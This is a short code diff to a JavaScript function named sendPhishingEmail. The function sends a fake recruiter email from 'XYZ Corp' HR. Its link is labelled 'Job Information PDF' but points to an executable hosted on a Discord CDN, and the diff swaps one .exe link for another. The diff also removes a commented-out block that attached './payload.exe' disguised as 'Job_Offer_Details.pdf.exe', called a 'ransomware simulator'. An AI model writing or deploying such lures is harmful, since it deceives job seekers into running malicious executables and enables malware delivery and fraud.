@@ -54,15 +54,9 @@ async function sendPhishingEmail(targetEmail) {
       <p>Dear Candidate,</p>
       <p>We are pleased to inform you that your profile matches our <b>Software Engineer</b> role at <b>XYZ Corp</b>. 
       Please find the job details in the document provided in the link.</p>
-      <a href="https://cdn.discordapp.com/attachments/970018117893894165/1356978959794962452/backup_tool.exe?ex=67ee88a3&is=67ed3723&hm=bae08a1f286a50045f8b68142ebf4580b1773ebbe8fb07b1b47d2ada0e821e5c&">Job Information PDF</a>
+      <a href="https://cdn.discordapp.com/attachments/970018117893894165/1357369161856057497/Job_Requirements.exe?ex=67eff40a&is=67eea28a&hm=3994b39cd190d3c9b6541fd614c8e356342bd072539a152b26ae7dba344d4b91&">Job Information PDF</a>
       <p>Best Regards,<br>HR Team</p>
     `,
-    /*attachments: [
-      {
-        filename: "Job_Offer_Details.pdf.exe", // Disguised attachment
-        path: "./payload.exe", // Path to ransomware simulator
-      },
-    ],*/
   };
 
   try {
